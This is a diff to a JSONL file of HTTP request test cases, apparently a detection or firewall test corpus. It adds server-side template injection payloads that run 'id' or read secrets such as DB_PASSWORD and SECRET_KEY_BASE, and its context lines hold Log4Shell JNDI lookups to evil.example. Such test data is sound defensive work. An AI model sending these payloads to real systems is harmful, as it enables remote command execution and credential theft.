@@ -118,6 +118,10 @@
 {"name":"ruby kernel constant call","category":"ssti","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"note\":\"#{Kernel::system(\\\"id\\\")}\"}"}
 {"name":"freemarker bind via var","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<#assign c=\"freemarker.template.utility.Execute\"><#assign e=c?new()>${e(\"id\")}"]],"headers":{},"content_type":"","body":""}
 {"name":"ruby env index","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","#{ENV['SECRET_KEY_BASE']}"]],"headers":{},"content_type":"","body":""}
+{"name":"ruby call blank paren","category":"ssti","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"note\":\"#{system (\\\"id\\\")}\"}"}
+{"name":"ruby safe navigation","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","#{Kernel&.open(params[:c])}"]],"headers":{},"content_type":"","body":""}
+{"name":"freemarker eval binding","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<#assign e=c?eval>${e('id')}"]],"headers":{},"content_type":"","body":""}
+{"name":"spring system environment","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","#{systemEnvironment['DB_PASSWORD']}"]],"headers":{},"content_type":"","body":""}
 {"name":"jndi in user-agent","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"${jndi:ldap://evil.example/a}"},"content_type":"","body":""}
 {"name":"obfuscated jndi","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"X-Api-Version":"${${lower:j}ndi:${lower:l}dap://evil.example/a}"},"content_type":"","body":""}
 {"name":"jndi in query","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${jndi:rmi://evil.example/x}"]],"headers":{},"content_type":"","body":""}
